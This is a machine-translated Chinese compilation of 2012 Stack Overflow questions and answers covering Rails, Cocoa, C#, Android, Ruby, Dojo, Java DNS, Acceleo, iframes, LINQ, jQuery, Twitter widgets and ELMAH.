我正在尝试创建一个新的 Rails 应用程序，但由于此异常而失败[http://pastebin.com/cNKDuFVc](http://pastebin.com/cNKDuFVc)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:03:41.443

OSX 中的 openssl 版本已损坏，您需要使用 HomeBrew、MacPorts、SMFramework 或仅使用 RVM 手动安装它，这是我对类似问题的正确修复的答案：

[https://stackoverflow.com/a/10540282/497756](https://stackoverflow.com/a/10540282/497756)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:12:34.033

你用macports吗？如果是，这可能会有所帮助[http://blog.55minutes.com/2012/01/fixing-a-segmentation-fault-in-ruby-193/](http://blog.55minutes.com/2012/01/fixing-a-segmentation-fault-in-ruby-193/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:12:50.020

希望这有助于[分割问题](http://blog.55minutes.com/2012/01/fixing-a-segmentation-fault-in-ruby-193/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-14T15:12:58.677

尝试使用以下内容创建一个新的 Rails 应用程序

```
rails new app_name --skip-bundle 
```

看起来 bundler 是 seg-faulting，所以如果跳过 bundler 有效，那么我会尝试重新安装 bundler，如果你仍然有问题，你可能需要重新安装那个版本的 ruby​​。

你用什么版本的 OS X 和 XCode 安装了 rvm？ruby 问题可能是由 XCode 引起的

# visual-studio-2010 - 有没有办法让 Visual Studio 记住最后一个插入符号的位置？

> ID：11955386
> 
> 赞同：1
> 
> 时间：2012-08-14T15:10:08.357
> 
> 标签：visual-studio-2010, text-editor, lost-focus

所以我在 VS 编辑器中编码。然后焦点被（臃肿的）GUI的其他部分不必要地窃取了，我忘记了我在哪里 - 文本插入符号消失了。

有没有办法阻止焦点被盗，或者如果失败了，让 VS 记住最后一个插入符号的位置？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:23:47.483

我相信在插入符号历史中来回走动的捷径是：

返回：`ctrl`+`-`

前锋：`ctrl`+ `shift`+`-`

（`-`是一个破折号）

# cocoa - 在 64 位架构中构建时的 Cocoa NSInteger

> ID：11955387
> 
> 赞同：0
> 
> 时间：2012-08-14T15:10:08.523
> 
> 标签：cocoa, nsinteger

我将 NSSegmentedControl 设置为发送者，当用户单击对象中的每个按钮时添加功能。下面的片段对我来说总是很好。它仍然存在，但是当我使用 64 位架构构建时收到以下警告。当我恢复到 32 位时，警告就会消失。有人可以告诉我如何编辑代码吗？谢谢您的帮助。-保罗。

“隐式转换失去整数精度：NSInteger（又名long）到“int”

```
int selectedSegment = [arSegController selectedSegment];
int clickedSegmentTag = [[arSegController cell] tagForSegment:selectedSegment];

if (clickedSegmentTag == 0) { 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:16:02.150

NSInteger 只不过是一个 typedef'd long。您应该使用 NSInteger 但如果由于某种原因您需要使用 int 然后尝试类型转换。

```
int selectedSegment = (int)[arSegController selectedSegment]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:20:24.507

[64位指南](http://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/64bitPorting/transition/transition.html#//apple_ref/doc/uid/TP40001064-CH207-SW1)

我相信您正在将一个 8 字节长的 long 变量分配给一个 4 字节长的 int。我认为在 mac 中他们使用 LP64，这意味着 long 和指针获得 8 个字节。声明 selectedSegment NSInteger 也应该解决这个问题。在 32 位机器上，长度为 32 位，而在 64 位机器上，长度为 64 位。

```
NSInteger selectedSegment = [arSegController selectedSegment]; 
NSInteger clickedSegmentTag = [[arSegController cell] tagForSegment:selectedSegment]; 

if (clickedSegmentTag == 0) { 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:13:13.157

您需要使用`NSInteger`而不是`int`您的变量。您可以只查看 中的声明`NSSegmentedControl.h`，但最好阅读 Apple 的[64-Bit Transition Guide for Cocoa](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Cocoa64BitGuide/64BitChangesCocoa/64BitChangesCocoa.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:20:53.247

NSInteger 似乎在 64 位平台上被定义为 long（因此在 32 位 OS X 和 iOS 上，您不会收到此警告）。此外，在这些平台上，long 是 64 位长，而 int 只是 32 位 - 所以，正如编译器告诉你的那样，你会失去精度。数字 >= 2 ^ 32 不能用 32 位表示，因此对于这些数字，您可能会遇到一些奇怪的行为（与数字被截断有关）。

解决方案：将方法的返回值显式转换为`(int)`.

# c# - 为什么我在执行 BeginGetRequestStream 时会收到 ProtocolViolationException

> ID：11955391
> 
> 赞同：2
> 
> 时间：2012-08-14T15:10:31.753
> 
> 标签：c#, silverlight, windows-phone

我是银光新手。我正在为 Windows 手机使用 Visual Studio 2010 编程。我尝试做 HttpWebRequest 但调试器说 ProtocolViolationException。这是我的代码

```
 private void log_Click(object sender, RoutedEventArgs e)
        {
            //auth thi is my url for request
            string auth;
            string login = Uri.EscapeUriString(this.login.Text);
            string password = Uri.EscapeUriString(this.pass.Password);
            auth = "https://api.vk.com/oauth/token";
            auth += "?grant_type=password" + "&client_id=*****&client_secret=******&username=" + login + "&password=" + password + "&scope=notify,friends,messages";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(auth);
            request.BeginGetRequestStream(RequestCallBack, request);//on this line debager say ProtocolViolationExceptio
        }

        void RequestCallBack(IAsyncResult result)
        {
            HttpWebRequest request = result.AsyncState as HttpWebRequest;
            Stream stream = request.EndGetRequestStream(result);
            request.BeginGetResponse(ResponceCallBack, request);
        }
        void ResponceCallBack(IAsyncResult result)
        {
            HttpWebRequest request = result.AsyncState as HttpWebRequest;
            HttpWebResponse response = request.EndGetResponse(result) as HttpWebResponse;
            using (StreamReader sr = new StreamReader(response.GetResponseStream()))
            {
                string a =sr.ReadToEnd();
                MessageBox.Show(a);
            }

        } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:16:35.410

我认为问题在于您使用的不是 POST，而是 GET。尝试这个：

```
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(auth);
request.Method = "POST";
request.BeginGetRequestStream(RequestCallBack, request); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T16:46:07.913

当你得到它时，你甚至没有对请求流做任何事情。

`HttpWebRequest`假设您尝试获取它的原因是向其写入内容（毕竟，获取它的唯一原因）。

由于不允许您在 GET 请求中包含内容，因此它意识到您可以对该流执行的唯一操作是违反 HTTP 协议的操作。作为使用 HTTP 协议的工具，它的工作就是阻止你犯这个错误。

所以它抛出`ProtocolViolationException`。

删掉有关请求流的部分 - 它仅适用于 POST 和 PUT。直接到那个点`GetResponse()`或`BeginGetResponse()`那个点。

# android - Android LinearLayout 总是全宽

> ID：11955392
> 
> 赞同：0
> 
> 时间：2012-08-14T15:10:35.423
> 
> 标签：android, xml, layout, android-linearlayout

我正在尝试为平板设备设计类似的东西

-640x480 区域（左边界）--------灵活的空宽度--------控制区域（右边界）-

灵活的宽度取决于平板电脑的大小。滚动窗格仅用于在移动设备上进行调试。

```
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:tools="http://schemas.android.com/tools"
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/scrollView11"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" >

    <HorizontalScrollView
        android:id="@+id/scrollView12"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >

        <LinearLayout
            android:id="@+id/ll1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="#24476D" >

            <view
                android:id="@+id/dmi"
                android:layout_width="640dp"
                android:layout_height="480dp"
                android:layout_gravity="left"
                android:layout_marginLeft="10dp"
                android:layout_marginTop="20dp"
                android:layout_weight="1"
                class="com.example.ecorailnet.DMIView"
                android:background="#8fc7ff" />

            <TextView
                android:id="@+id/empty_list_view"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="List view is empty"
                android:visibility="gone" />

            <view
                android:id="@+id/cpp"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_gravity="right"
                android:layout_marginLeft="20dp"
                android:layout_marginTop="20dp"
                android:layout_weight="1"
                class="com.example.ecorailnet.ControlPanel" />
        </LinearLayout>
    </HorizontalScrollView>
</ScrollView> 
```

最后是现在的情况以及它应该是什么样子。

[现在](http://www7.pic-upload.de/14.08.12/tyswp1zydud7.png)

[后](http://www7.pic-upload.de/14.08.12/93c3pkpbtbyn.png)

提前致谢

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:29:34.033

如果您只想要左边的东西和右边的东西，请使用`RelativeLayout`：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#24476D" >

    <view
        android:id="@+id/dmi"
        android:layout_width="640dp"
        android:layout_height="480dp"
        android:layout_alignParentLeft="true"
        android:layout_centerVertical="true"
        android:layout_gravity="left"
        android:layout_marginLeft="10dp"
        android:layout_marginTop="20dp"
        class="com.example.ecorailnet.DMIView"
        android:background="#8fc7ff" />

    <view
        android:id="@+id/cpp"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:layout_centerVertical="true"
        android:layout_gravity="right"
        android:layout_marginLeft="20dp"
        android:layout_marginTop="20dp"
        class="com.example.ecorailnet.ControlPanel" />

</RelativeLayout> 
```

你能得到的唯一问题是整个东西不适合小屏幕。在这种情况下，两个视图将重叠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T16:15:28.463

如果你真的确定你想要一个 640x480 像素的 DMIView。

您可以尝试覆盖 DMIView 的 onMeasureMethod

```
@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
    super.onMeasure(widthMeasureSpec, heightMeasureSpec);
    this.setMeasuredDimension(640,480);
} 
```

或者如果你想要一个占据所有高度的右缩放 DMIView

```
@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
    super.onMeasure(widthMeasureSpec, heightMeasureSpec);
    int parentHeight = MeasureSpec.getSize(heightMeasureSpec);
    this.setMeasuredDimension(Math.round(parentHeight * 640 / 480f),parentHeight);      
} 
```

希望这些会有所帮助。

# ruby - Ruby：基于控制台的菜单

> ID：11955395
> 
> 赞同：2
> 
> 时间：2012-08-14T15:10:40.380
> 
> 标签：ruby, user-interface

我有一组名称和 URL，并希望以向上/向下滚动菜单的形式向用户显示名称列表。基本上是`dialog`外壳内允许的。

我已经调查过了`ncurses-ruby`，但它们似乎要么被放弃为一个项目，要么甚至从他们的例子中抛出错误（如果存在的话）`rdialog`。`HighLine`

有人可以向我指出一个不错的、可用的 TUI 菜单的 gem，*或者*一个简单的（我会是新手……）介绍如何在 Rails 中做到这一点（即可用数据的表示（=什么我的数组中有））以及如何处理用户的选择？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-09-26T19:28:03.587

我认为你所有的建议都是有效的，然后出现了更多 (n)curses 包装器，以及更多进化的框架，如[rutui](https://github.com/b1nary/rutui)、[rbcurse](https://github.com/rkumar/rbcurse-core)（不幸的是不活跃）、[vedeu](https://github.com/gavinlaking/vedeu)和可能的其他一些。

但是，我现在的看法是**[hirb](https://github.com/cldwalker/hirb)或[highline](https://github.com/JEG2/highline)**，它们既稳定又积极维护。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:33:42.753

绿鞋是这种工作的好宝石，它有菜单、选择、编辑框、文件对话框、复选框等，同时简单并且除了 Ruby 本身之外没有其他依赖项。

有一个很小但非常活跃的社区，有一个邮件列表来寻求帮助。有关详细信息，请参阅[http://vgoff.posterous.com/green-shoes](http://vgoff.posterous.com/green-shoes)。安装与`gem install green_shoes`

这里是一个小例子

```
Shoes.app title: 'Selecteer vakantie', height: 600 do
  background lightgreen..lightskyblue, :angle => 30
  @list = ["choice1","choice2"]
  @result = []
  stack do
    para "Make your choice.", font: "sans", size: 10
    flow do
      button "Ok" do
        selected = @list.map{|c, n| n if c.checked?}.compact
        @result[0].text = "you selected #{selected}"
      end
      button("End") {exit}
    end
    @list.map! do |name|
      flow { @c = check; para name, width: 500, font: "sans", size: 10 }
      [@c, name]
    end
    @result << para('', :stroke => forestgreen)
  end
end 
```

# html - 启动期间的 Dojo 1.7 表单 setFormValues

> ID：11955400
> 
> 赞同：0
> 
> 时间：2012-08-14T15:11:07.037
> 
> 标签：html, dojo

作为 Dojo 的新手，我正在尝试使用值初始化 Dijit 表单，例如从存储读取、XHR 等。

但是，调用会导致[http://yandex.st/dojo/1.7.3/dojox//form/manager/_Mixin.js](http://yandex.st/dojo/1.7.3/dojox//form/manager/_Mixin.js)抛出`form.setFormValues()`错误`TypeError: invalid 'in' operand this.formWidgets`

有什么我做错了还是这是Dojo问题？（完整的示例也可以在这里找到：http: [//pastebin.com/7LUHr3iA](http://pastebin.com/7LUHr3iA)）

```
<!-- language-all: lang-html -->
`
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/dojo/1.7.3/dijit/themes/claro/claro.css" media="screen">

    <script type="text/javascript">
        dojoConfig = {async: true,parseOnLoad: true};
    </script>
    <script type="text/javascript" src="http://yandex.st/dojo/1.7.3/dojo/dojo.js"></script>

    <script type="text/javascript">
        require(["dijit/form/TextBox","dijit/form/Button","dojox/form/Manager",
                "dojo/parser","dojo/dom","dijit/registry"], function () {});
    </script>
</head>
<body class="claro">

    <form id="myForm" method="post" data-dojo-type="dojox.form.Manager">

        <label for="name">Name</label>
        <input id="name" name="nameField" data-dojo-type="dijit.form.TextBox"/><br/>

        <label for="surname">Surname</label>
        <input id="surname" name="surnameField" data-dojo-type="dijit.form.TextBox"/><br/>

        <button data-dojo-type="dijit.form.Button">Submit</button>

        <script type="dojo/method" event="startup">
            var form = dijit.byId("myForm");

            form.setFormValues({
                nameField: "Hello",
                surnameField: "World"
            });
        </script>
    </form>
</body>
</html>
` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:28:40.247

Dojo 1.7 是异步的。代码应采用以下形式：

```
require(["dependency"], function(dep) {
  // use dependency
}); 
```

当您尝试在页面下方进一步引用它时，没有理由相信`dojox/form/Manager`会加载。

注册表是引用小部件的正确方法，而不是表单的 1.6 样式代码`dijit.byId`。请参阅[livedocs](http://livedocs.dojotoolkit.org/dijit/byId)。

*另请参阅[`dojo/domReady!`](http://dojotoolkit.org/reference-guide/1.7/dojo/domReady.html)插件。*

# c# - 通过 TCP c# 接收结构

> ID：11955404
> 
> 赞同：0
> 
> 时间：2012-08-14T15:11:09.183
> 
> 标签：c#, c, tcp, struct

这篇文章与我之前的一篇文章直接相关

[在 C# 中通过 TCP 发送 C 结构](https://stackoverflow.com/questions/11954431/sending-c-structs-through-tcp-in-c-sharp)

我的下一个问题是接收来自设备的适当响应。该文档为我提供了返回结构的以下代码。

```
typedef struct{
/*This value represents if the API request to modify has been a success or not*/
return_t ret_val;

/*Error code indicating error details*/
error_t err_code;

/*Response object for GET type action*/
U8 payload[0];
}MsgResp; 
```

我的问题是，如何将通过 TCP 接收的原始字节流放入这个结构中？同样，我的直觉告诉我与 memcpy 有关，但我不知道这如何转换为 C#。

我也对 return_t 和 error_t 类型感到困惑，因此对这些类型的任何了解也会有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:42:17.907

上面 SLaks 评论的链接正是我所需要的。

链接在这里：[如何在 C# 中将结构转换为字节数组](https://stackoverflow.com/questions/3278827/how-to-convert-structure-to-byte-array-in-c)

# java - Java中的非阻塞（异步）DNS解析

> ID：11955409
> 
> 赞同：30
> 
> 时间：2012-08-14T15:11:36.273
> 
> 标签：java, asynchronous, dns, nonblocking, event-driven

有没有一种干净的方法来异步解析 Java 中的 DNS 查询（通过主机名获取 IP），以非阻塞方式（即状态机，不是 1 个查询 = 1 个线程 - 我想同时运行数万个查询，但是不运行数万个线程）？

到目前为止我发现了什么：

*   标准`InetAddress.getByName()`实现是阻塞的，看起来标准 Java 库缺少任何非阻塞实现。
*   [Resolving DNS in bulk](https://stackoverflow.com/questions/10399374/resolving-dns-in-bulk) question 讨论了类似的问题，但找到的唯一解决方案是多线程方法（即一个线程在每个给定时刻仅处理 1 个查询），这不是真正可扩展的。
*   [dnsjava](http://www.xbill.org/dnsjava/)库也只是阻塞的。
*   dnsjava的[古老非阻塞扩展可以](http://blog.nominet.org.uk/tech/2006/08/08/nonblocking-extensions-to-dnsjava/)追溯到 2006 年，因此缺乏任何现代 Java 并发内容，例如`Future`范式使用，以及非常有限的仅队列实现。
*   [dnsjnio](http://sourceforge.net/projects/dnsjnio/)项目也是对 dnsjava 的扩展，但它也适用于线程模型（即 1 个查询 = 1 个线程）。
*   [asyncorg](http://code.google.com/p/asyncorg/)似乎是迄今为止我找到的针对此问题的最佳可用解决方案，但是：
    *   它也是 2007 年的，看起来被遗弃了
    *   几乎没有任何文档/javadoc
    *   使用了很多非标准的技术，比如`Fun`class

我错过了任何其他想法/实现？

**澄清**。我有相当大（每天几 TB）的日志量。每个日志行都有一个主机名，该主机名几乎可以来自互联网上的任何地方，我需要该主机名的 IP 地址以进行进一步的统计计算。行的顺序并不重要，所以，基本上，我的想法是启动 2 个线程：首先迭代行：

*   读取一行，解析，获取主机名
*   向 DNS 服务器发送查询以解析给定的主机名，不要阻止回答
*   将线路和 DNS 查询套接字句柄存储在内存中的某个缓冲区中
*   转到下一行

第二个线程将：

*   等待 DNS 服务器回答任何查询（使用`epoll`/ `kqueue`like 技术）
*   阅读答案，找出它在缓冲区中的哪一行
*   将解析 IP 的行写入输出
*   继续等待下一个答案

Perl 中使用的一个简单模型实现`AnyEvent`向我表明，我的想法通常是正确的，并且我可以通过这种方式轻松实现每秒 15-20K 查询的速度（天真的阻塞实现每秒查询 2-3 次 - 只是为了比较 - 所以这就像4个数量级的差异）。现在我需要在 Java 中实现相同的功能 - 我想跳过推出我自己的 DNS 实现；）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T00:49:51.887

您可能正在寻找基于 MINA[的 DNS 的 Apache 目录服务实现。](http://directory.apache.org/apacheds/)JavaDocs 和其他有用的指南位于该页面的左侧边栏中。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-06-03T15:55:48.090

[在 netty 中](https://github.com/netty/netty/pull/1354)有一些关于非阻塞 DNS的工作，但它仍在进行中，可能只会在 5.0 中发布

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-18T00:40:54.097

我认为，您必须自己在原始 UDP 之上使用基本套接字支持实现 DNS 客户端协议，或者在 TCP 之上使用 NIO 通道实现。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-20T13:27:18.863

我没有你的问题的答案（我不知道是否有一个 DNS 库可以在你想要的异步模式下运行），这对于评论来说太长了。

但是，您应该能够快速生成异步，而无需自己编写完整的 DNS 处理程序。警告，我没有这样做，所以我可能都错了。

从 dnsjava 代码开始，您应该能够实现自己的解析器，该解析器将为您提供发送方和接收方方法。查看[SimpleResolver](http://dnsjava.svn.sourceforge.net/viewvc/dnsjava/tags/dnsjava-2.1.3/org/xbill/DNS/SimpleResolver.java?revision=1665&view=markup)并查看`send`方法。您应该能够将此方法分解为两种方法，一种将您的请求发送到对 TCPClient 或 UDPClient 的调用（正如您所描述的，此时您将处理实际的在线发送，与您的第一个线程），并且，一个接收，将由您的第二个线程调用作为对套接字读取的响应，并处理解析响应。您可能必须从 SimpleResolver 复制所有代码（您需要许多私有方法，并且[许可允许它](http://dnsjava.svn.sourceforge.net/viewvc/dnsjava/tags/dnsjava-2.1.3/LICENSE?revision=1665&view=markup))，或者，您可以创建自己的版本并简单地将其加载到类路径中的 jared 版本之前，或者，您可以反映您对相关方法的方式[并将它们设置为可访问](http://docs.oracle.com/javase/6/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible%28boolean%29)。

您可以使用[netty](https://netty.io/)或[mina](http://mina.apache.org/)快速构建网络客户端。对于文档，我更喜欢 netty。

如果您确实走这条路并且可以/想要开源它，如果您遇到麻烦，我可以留出一些时间来提供帮助。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-23T10:44:30.943

Linux有异步DNS查找功能：[http ://www.imperialviolet.org/2005/06/01/asynchronous-dns-lookups-with-glibc.html](http://www.imperialviolet.org/2005/06/01/asynchronous-dns-lookups-with-glibc.html)

如果您在 Linux 上，您*只需*将其包装在一些 JNI 中。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-08-15T22:44:38.517

你有多种选择

**选项 1：Java 5 执行器**

1.  固定线程池：Executors.newFixedThreadPool(int)
2.  [Future](http://java-x.blogspot.com/2006/11/java-5-concurrency-callable-and-future.html)：Future 代表异步计算的结果。提供了检查计算是否完成、等待其完成以及检索计算结果的方法。

**选项 2：带有 MessageListener 的 JMS**

1.  需要依赖 JMS Provider 等。

**选项 2：基于 Actor 的框架**

你可以用 this 很好地扩展它。看看[Akka](http://akka.io/)。

# eclipse-emf - 在 FOR 循环中增加一个变量

> ID：11955410
> 
> 赞同：2
> 
> 时间：2012-08-14T15:11:36.480
> 
> 标签：eclipse-emf, acceleo, ocl

我试图计算在 FOR 循环中条件为真的次数。我为模板声明了一个附加变量（FOUND : Integer），并且每次 [IF] 条件为“true”时我都尝试将其递增，但该变量仅在第一次递增，然后它又回到原来的状态价值。基本上，如果一开始 FOUND = 1，那么在每个循环中我都会得到 2 的输出。

这是我正在尝试使用的代码：

```
[template public genPartnerLinkJavaFile(aProcess : Process, varNameList : Sequence{String} .... etc)
 {FOUND : Integer = 1;}]
    [file ('PL'+aPartnerLink.name.toUpperFirst()+'.java', false, 'UTF-8')]
    public class ['PL'+aPartnerLink.name.toUpperFirst()/] {

[for (aVariable  : Variable | aProcess.eAllContents(Variable))]  
    [if (varNameList->includes(aVariable.name.toString() ) )]
    [FOUND+1/]
    [i/]
    [/if]
[/for] 
```

你知道我怎么能做到这一点或类似的东西吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T09:18:32.297

在 Acceleo 中，所有变量都是最终的。您可以使用一个集合来存储所有使用的值，然后计算其大小，或者如果您真的想使用一个值，您可以使用 Java 服务。我建议使用查询来计算所有有用的元素，因为查询的评估结果存储在缓存中，对性能的影响将是最小的。

# javascript - 从另一个 iframe 访问一个 iframe 的元素

> ID：11955413
> 
> 赞同：3
> 
> 时间：2012-08-14T15:11:41.420
> 
> 标签：javascript, iframe

我有一个父窗口和两个 iframe。我正在尝试从另一个 iframe 访问一个 iframe 的元素。使用代码：

```
function startplay(){
   var txt="";
   txt+= "some text";
   var tag = window.frames("plays").getElementById("myvideo");
   tag.innerHTML=txt;
} 
```

上面的代码位于一个由锚标记激活的 iframe 脚本中。但调用脚本时没有任何反应。myvideo 标签内容不会改变。这是从另一个 iframe 访问一个 iframe 元素的正确方法吗？我应该使用 parent.document.getElementById("plays").getElementById("myvideo"); 得到一个参考。我的视频。

代码位于 iframe(playright) 中，myvideo 标签位于 iframe(plays) 中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:19:02.510

如果您在其中一个 iframe 中，则需要使用“父级”转到其父级，并从那里引用 iframe 对象。

所以这应该工作：

```
parent.nameofotheriframe.getElementById("myvideo"); 
```

（通过使用 getElementById 您引用的是 <IFRAME> 标记，而不是 iframe 对象）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-04T17:57:24.127

我遇到了同样的问题并像这样解决了它：

**我的主页代码：**

```
<div id="left">
    <iframe id="leftframe" name="leftframe" src="iframe-left.html"></iframe>
</div>
<div id="right">
    <iframe id="rightframe" name="rightframe" src="iframe-right.html"></iframe>
</div> 
```

**左框架：**

```
<div id="DivInLeftFrame">aaa</div> 
```

**右框架：**

```
<input type="button" value="clickme" onclick="changeLeftFrame();"> 
```

功能是：

```
changeLeftFrame(){
     parent.leftframe.document.getElementById('DivInLeftFrame').innerHTML = 'bbb';
} 
```

添加“文档”以工作。

# asp.net-mvc-3 - 请解释这种行为（LINQ 是否缓存）？

> ID：11955414
> 
> 赞同：2
> 
> 时间：2012-08-14T15:11:45.390
> 
> 标签：asp.net-mvc-3, linq, linq-to-sql, mvc-mini-profiler

我最近在我的项目中添加了很棒的[MiniProfiler包，它对提高页面渲染速度有很大帮助。](http://miniprofiler.com/)

现在我注意到以下内容。在 SQL 中，对页面的每个第一次请求都比后续访问花费的时间要长得多。

这是一个例子：

*第一次访问：*

![第一次访问](../Images/4b352f19f59db18c62e403b2e2ed09d0.png)

*第二次及以后的访问：*

![第二次访问](../Images/5b227b2f71d400de79995162354e3bfa.png)

这是由 LINQ 或 SQL Server 中的某种缓存引起的吗？我在我的 dbml 文件中使用带有默认设置的 .NET 4 和 LINQ-to-SQL。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:15:35.547

有很多事情会影响第一击的表现。抖动可能需要做一些工作，并且不同级别的缓存可能会发挥作用。

也就是说，SQL Server 具有非常先进的缓存功能。对服务器的重复查询比初始查询快得多并不罕见。

# jquery - 将键盘导航添加到下拉列表中的 CheckBoxList

> ID：11955415
> 
> 赞同：1
> 
> 时间：2012-08-14T15:11:46.840
> 
> 标签：jquery, asp.net, user-controls, checkboxlist, keyboard-navigation

我有一个“DropDownCheckBoxList”用户控件，我在下拉 DIV 中使用文本框、图像（箭头）和隐藏的 ASP.Net CheckBoxList 控件从头开始创建。

结合大量的 JQuery，它运行良好，除了最后一个功能......*下拉列表项的*键盘向上/向下导航。

## 它看起来像这样：

![在此处输入图像描述](../Images/0f443ec5ac97533a14305e47b39ab2fb.png)

## 生成的 HTML 示例如下所示：

```
<div style="width: 170px;" class="dropDownComboxBoxList">
    <div onclick="DropDown('#MainContent_DropDownCheckBoxList1_dropDownDiv', '#MainContent_DropDownCheckBoxList1_dropDownTextBox')" class="dropDownControl" id="MainContent_DropDownCheckBoxList1_dropDownControl">
        <div style="width: 150px;" class="dropDownLeft">
            <input type="text" class="dropDownEdit" id="MainContent_DropDownCheckBoxList1_dropDownTextBox" readonly="readonly" value="Item 0, Item 1" name="ctl00$MainContent$DropDownCheckBoxList1$dropDownTextBox">
        </div>
        <div class="dropDownRight">
            <img src="http://localhost:28071/Images/DropDown_off.gif" class="dropDownImg img-swap" id="MainContent_DropDownCheckBoxList1_dropDownImage">
        </div>
    </div>
    <div style="width: 300px; max-height: 300px; margin-top: 0px; display: none;" class="dropDownDiv" id="MainContent_DropDownCheckBoxList1_dropDownDiv">
        <table style="height: 40px; width: 290px;" class="checkBoxList dropDownTable" id="MainContent_DropDownCheckBoxList1_checkBoxList">
            <tbody>
                <tr class="checkSel">
                    <td><input type="checkbox" value="0" checked="checked" id="MainContent_DropDownCheckBoxList1_checkBoxList_0" class="dropDownCheck"><label for="MainContent_DropDownCheckBoxList1_checkBoxList_0" class="dropDownLabel">Item 0</label></td>
                </tr>
                <tr class="checkSel">
                    <td><input type="checkbox" value="1" checked="checked" id="MainContent_DropDownCheckBoxList1_checkBoxList_1" class="dropDownCheck"><label for="MainContent_DropDownCheckBoxList1_checkBoxList_1" class="dropDownLabel">Item 1</label></td>
                </tr>
                <tr>
                    <td><input type="checkbox" value="2" id="MainContent_DropDownCheckBoxList1_checkBoxList_2" class="dropDownCheck"><label for="MainContent_DropDownCheckBoxList1_checkBoxList_2" class="dropDownLabel">Item 2</label></td>
                </tr>
                <tr>
                    <td><input type="checkbox" value="3" id="MainContent_DropDownCheckBoxList1_checkBoxList_3" class="dropDownCheck"><label for="MainContent_DropDownCheckBoxList1_checkBoxList_3" class="dropDownLabel">Item 3</label></td>
                </tr>
            </tbody>
        </table>
    </div>
</div> 
```

我已经尝试连接到[jQuery.keynav](https://github.com/mikehostetler/jquery-keynav/blob/master/jquery.keynav.js)，然后连接到[jQuery.navigate](https://github.com/tommoor/navigate-jquery-plugin) ，但是虽然两者都捕获按键，但它们对选择没有任何影响，并且上/下键仍然只是滚动下拉列表（当有更多项目时当然，与此示例不同）。

jQuery.navigate 的当前连接对于显示的 HTML 如下所示：

```
$('#MainContent_DropDownCheckBoxList1_checkBoxList').filter('td').navigate({ mouse: true, activeClass: 'checkHover' }); 
```

有什么想法我还需要做些什么才能让它导航？这只是在下拉列表中使用 CheckBoxList 的问题吗？我是否滥用了导航加载项？

# wordpress - Twitter API 错误请求？

> ID：11955421
> 
> 赞同：0
> 
> 时间：2012-08-14T15:11:56.793
> 
> 标签：wordpress, twitter, widget, bad-request

我在 WP 页面上使用 2 个小部件 - 1 个内置在主题中并使用 API，另一个是直接从 twitter 小部件页面复制的代码，事实上，即使在它正在获取的 twitter 小部件页面上，它们也不起作用同样的 400 错误请求错误：[https ://twitter.com/about/resources/widgets/widget_profile](https://twitter.com/about/resources/widgets/widget_profile)

这是 twitter 的一个问题，由于某种原因没有出现在[http://status.twitter.com](http://status.twitter.com)上吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:25:23.667

似乎只是 Twitter 不可靠的问题。整个早上都开/关。任何有类似问题的人......只是等待它，不幸的是。

# iis - 安全 elmah 目录得到 404？

> ID：11955423
> 
> 赞同：0
> 
> 时间：2012-08-14T15:12:16.837
> 
> 标签：iis, elmah

我已经在 asp.net mvc 3 站点上设置了 ELMAH，并在[此处](https://stackoverflow.com/questions/1245364/securing-elmah-in-asp-net-website)的另一个 SO 问题中详细说明了正确的配置。在我的本地虚拟开发 IIS 服务器上一切正常，但是当我尝试转到 /Admin/Elmah.axd 时部署到 IIS 服务器时，我得到标准的 IIS“404 - 找不到文件或目录。”。是否有我缺少的 IIS 设置？

```
